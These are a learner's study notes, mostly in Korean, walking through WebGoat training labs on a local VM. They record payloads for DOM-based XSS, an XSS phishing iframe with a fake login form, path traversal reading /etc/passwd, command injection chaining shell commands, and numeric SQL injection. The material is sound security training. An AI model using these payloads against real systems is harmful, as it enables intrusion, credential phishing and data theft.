학원: (192.168.56.131)
![[Pasted image 20241022093053.png]]
1) # Using an Access Control Matrix
2) # Bypass a Path Based Access Control Scheme
4) # LAB: DOM-Based cross-site scripting
   - ![[Pasted image 20241022101502.png]]
   - \<img src=/WebGoat/images/logos/owasp.jpg>
   - 스크립트 내용을 받아오는 방법 ![[Pasted image 20241022102353.png]]
   - `<img src=x onerror='document.body.innerHTML="<img src=/WebGoat/images/logos/owasp.jpg>"'>`
     ![[Pasted image 20241022102623.png]]
5) # Multi Level Login 2
   - 2차 인증 이상의 인증이 있는 것을 의미![[Pasted image 20241022103218.png]]
   - 2차 인증을 완료하면 신용카드 정보를 확인할 수 있다.![[Pasted image 20241022103324.png]]
   - Tan 코드를 입력해 로그인을 시도할 때 Proxy를 통해 hidden user을 목표로 하는 Jane으로 바꿔서 요청하면 성공![[Pasted image 20241022103935.png]]
6) # Discover Clues in the HTML
   - 웹 소스코드를 확인하면 발견할 수 있음![[Pasted image 20241022104837.png]]
     ![[Pasted image 20241022104946.png]]
7) # Phishing with XSS
   - ![[Pasted image 20241022110334.png]]
   - `<iframe frameborder=0 width=400 height=200 src="내가 만든 피싱 주소"></iframe>`
     `<iframe frameborder=0 width=400 height=200 src=http://192.168.56.102/>`
```html
User Authentication
<p>
<form id=id action=/ method=GET>
	Username<br>
	<input type=text name=id><br>
	Password<br>
	<input type=password name=pw><br>
	<input type=submit value=Login onclick="document.getElementById('id').submit()">
</form>
```
8) # Command Injection
   ![[Pasted image 20241022112010.png]]
   HelpFile 대신에 `../../../../../../../../../etc/passwd`를 추가![[Pasted image 20241022112209.png]]
   ![[Pasted image 20241022112424.png]]
   `CSRF.help&id&pwd&uname` 형식으로 바꿔도 명령어를 다중으로 실행하여 원하는 결과를 만들 수도 있다.(이때 URL encoding 필요)
   `CSRF.help%22%26id%26pwd%26uname%22`![[Pasted image 20241022113442.png]]
9) # Numeric SQL Injection
   프록시로 잡아서 sql injection 시도![[Pasted image 20241022113920.png]]
   `102%20or%201=1`![[Pasted image 20241022115048.png]]
   이때 특수문자(띄어쓰기)는 %20(아스키코드)으로 encoding
10) String SQL Injection
![[Pasted image 20241022093320.png]]
https://github.com/WebGoat/WebGoat/wiki/Main-Exploits